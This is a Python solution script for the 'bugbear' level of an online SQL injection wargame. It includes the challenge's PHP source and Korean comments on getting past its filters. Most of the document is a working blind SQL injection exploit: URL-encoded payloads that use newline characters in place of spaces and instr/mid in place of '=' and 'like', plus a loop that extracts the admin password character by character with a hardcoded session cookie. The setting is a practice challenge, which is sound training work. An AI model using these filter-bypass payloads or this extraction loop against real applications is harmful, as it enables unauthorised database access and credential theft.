'''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
'''
# ascii 우회 -> ord 사용
# =, like 우회 -> instr 또는 < , > 사용
# pw=&no=0%0a||%0ainstr(id,\"admin\")%0a%26%26%0alength(pw)>8
# https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=&no=0%0a||%0ainstr(id,%22admin%22)%0a%26%26%0ainstr(mid(pw,1,2),%222%22)

from re import I
import requests
from urllib import parse

host = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}

s = requests.Session()
origin_pwd = ""

def main() :  
  password_length = find_password_length()
  password_inject(password_length)
  print(f"admin password is ... {origin_pwd}")

def find_password_length() : # 패스워드 길이 찾기
  print("password length find start!!")
  for i in range(1, 50) :          
    param = f"pw=&no=0%0a||%0ainstr(id,\"admin\")%0a%26%26%0alength(pw)>{i}"
    res = s.get(host + (param), cookies=cookies)
    if "Hello admin" not in res.text :
      print(f"password length is {i}")
      print("password length find end !!")
      return i

def password_inject(password_length) :  
  print("password inject start !! ")
  for i in range(1, password_length + 1) :
    for j in range(47, 123) : # 48~57 0~9 / 65 ~90 A-Z 97~122 a-z          
      param = f"pw=&no=0%0a||%0ainstr(id,\"admin\")%0a%26%26%0ainstr(mid(pw,{i},1),\"{chr(j)}\")"
      res = s.get(host + param, cookies=cookies)
      if "No Hack ~_~" in res.text :
        print("filtering...")        
      if "Hello admin" in res.text :
        global origin_pwd
        origin_pwd += chr(j)
        break
  print("password inject end !! ")

if __name__ == "__main__":
  main()